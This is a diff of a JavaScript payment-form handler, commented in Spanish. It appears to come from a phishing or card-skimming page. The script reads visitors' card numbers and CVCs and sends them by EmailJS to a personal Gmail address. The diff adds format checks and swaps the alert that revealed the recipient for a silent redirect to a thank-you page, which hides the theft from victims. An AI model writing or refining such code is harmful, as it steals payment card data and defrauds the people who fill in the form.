@@ -4,7 +4,7 @@
 })();
 
 document.getElementById('paymentForm').addEventListener('submit', function(e) {
-    e.preventDefault();
+    e.preventDefault(); // Evita que el formulario se envíe de forma tradicional
 
     // Recopila los datos del formulario
     const cardData = {
@@ -13,15 +13,25 @@ document.getElementById('paymentForm').addEventListener('submit', function(e) {
         cvc: this.querySelector('input[type="text"]:last-child').value // CVC
     };
 
+    // Validaciones adicionales
+    if (cardData.numero.length !== 16 || !/^\d+$/.test(cardData.numero)) {
+        alert('El número de tarjeta debe tener 16 dígitos.');
+        return;
+    }
+
+    if (cardData.cvc.length !== 3 || !/^\d+$/.test(cardData.cvc)) {
+        alert('El código CVC debe tener 3 dígitos.');
+        return;
+    }
+
     // Envía los datos a tu correo usando EmailJS
     emailjs.send("service_syrc1uk", "template_u3etoro", cardData) // Service ID y Template ID
         .then(() => {
-            alert('Datos enviados a karentre100@gmail.com');
-            document.getElementById('paymentForm').reset(); // Limpia el formulario
-            document.getElementById('thankYouMessage').classList.remove('hidden'); // Muestra el mensaje de agradecimiento
+            // Redirige a la página de agradecimiento
+            window.location.href = "thank-you.html";
         })
         .catch(error => {
-            alert('Error: No se pudo enviar el correo');
+            alert('Error: No se pudo enviar el correo'); // Muestra un mensaje de error
             console.error(error); // Imprime el error en la consola
         });
 });
